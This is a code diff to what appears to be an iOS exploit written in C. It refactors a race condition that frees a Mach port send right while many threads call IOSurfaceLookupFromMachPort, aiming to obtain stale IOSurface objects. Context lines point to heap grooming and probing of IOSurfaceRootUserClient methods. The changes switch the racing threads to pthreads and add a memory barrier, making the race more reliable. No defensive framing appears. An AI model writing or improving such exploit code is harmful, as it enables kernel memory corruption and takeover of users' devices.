@@ -1164,6 +1164,21 @@ static void release_groom(mach_port_t *wake_ports, int count) {
     }
 }
 
+typedef struct {
+    mach_port_t port;
+    volatile int *go;
+    volatile int done;
+    IOSurfaceRef result;
+} port_lookup_ctx_t;
+
+static void *port_lookup_fn(void *arg) {
+    port_lookup_ctx_t *ctx = (port_lookup_ctx_t *)arg;
+    while (!*(ctx->go)) { /* spin */ }
+    ctx->result = IOSurfaceLookupFromMachPort(ctx->port);
+    ctx->done = 1;
+    return NULL;
+}
+
 /* Multiple struct format attempts for IOSurface external methods.
  * IOSurfaceRootUserClient methods take struct input, NOT scalar.
  * Format varies by selector and iOS version. We try several sizes
@@ -9554,35 +9569,31 @@ vps_cd_done:
             CFRelease(s);
 
             /* Race: deallocate port send right vs lookup from port */
-            /* We spin up multiple lookups racing against the dealloc */
             volatile int go = 0;
-            volatile IOSurfaceRef stale_results[16] = {0};
-            volatile int lookup_done[16] = {0};
-
-            /* Lookup threads */
             int nlkp = (thread_count > 16) ? 16 : thread_count;
+            port_lookup_ctx_t lkp_ctxs[16];
+            pthread_t lkp_threads[16];
+
             for (int i = 0; i < nlkp; i++) {
-                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
-                    while (!go) { /* spin */ }
-                    stale_results[i] = IOSurfaceLookupFromMachPort(p);
-                    lookup_done[i] = 1;
-                });
+                lkp_ctxs[i].port = p;
+                lkp_ctxs[i].go = &go;
+                lkp_ctxs[i].done = 0;
+                lkp_ctxs[i].result = NULL;
+                pthread_create(&lkp_threads[i], NULL, port_lookup_fn, &lkp_ctxs[i]);
             }
 
             /* Small delay then fire + dealloc */
             usleep(1);
+            __sync_synchronize();
             go = 1;
             mach_port_deallocate(mach_task_self(), p);
 
-            /* Wait for lookups */
-            for (int i = 0; i < nlkp; i++) {
-                int wait = 0;
-                while (!lookup_done[i] && wait < 1000) { usleep(10); wait++; }
-            }
+            for (int i = 0; i < nlkp; i++)
+                pthread_join(lkp_threads[i], NULL);
 
             /* Check results */
             for (int i = 0; i < nlkp; i++) {
-                IOSurfaceRef r = (IOSurfaceRef)stale_results[i];
+                IOSurfaceRef r = lkp_ctxs[i].result;
                 if (r) {
                     uint32_t rid = IOSurfaceGetID(r);
                     size_t rw = IOSurfaceGetWidth(r);
